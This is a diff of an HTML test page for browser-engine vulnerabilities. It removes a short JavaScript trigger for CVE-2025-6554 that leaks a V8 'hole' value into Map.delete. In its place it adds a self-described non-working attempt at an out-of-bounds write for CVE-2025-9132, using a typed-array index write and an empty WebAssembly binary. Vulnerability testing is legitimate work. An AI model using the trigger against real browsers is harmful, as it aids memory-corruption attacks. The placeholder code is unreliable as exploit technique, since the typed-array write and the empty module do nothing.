@@ -1,19 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head><title>Test CVE‑2025‑6554</title></head>
+<head><title>Test CVE‑2025‑9132</title></head>
 <body>
   <script>
-    // PoC code from DarkNavy or the simple snippet
-    function f() {
-      let x;
-      delete x?.[y]?.a;
-      return y;
-      let y;
-    }
-    let hole = f();
-    let map = new Map();
-    map.delete(hole);
-    console.log("Finished test");
+    console.log("Starting test of CVE‑2025‑9132");
+    // Pseudocode: attempt to cause OOB write
+    // e.g., create a TypedArray, perform some mis‑indexed write,
+    // use WebAssembly to extend bounds, etc.
+
+    // Example (not known working PoC)
+    let buffer = new ArrayBuffer(16);
+    let view = new Uint8Array(buffer);
+    // Intentionally out‑of‑bounds index
+    view[100] = 0xFF;
+    console.log("Write attempted to out‑of‑bounds index, see what happens");
+
+    // Try more complex approach with WebAssembly
+    const wasmCode = new Uint8Array([
+      // minimal wasm binary
+    ]);
+    WebAssembly.instantiate(wasmCode).then(obj => {
+      console.log("WASM loaded");
+      // perhaps use compiled functions to manipulate memory
+    }).catch(e => console.log("WASM load error: " + e));
   </script>
 </body>
 </html>
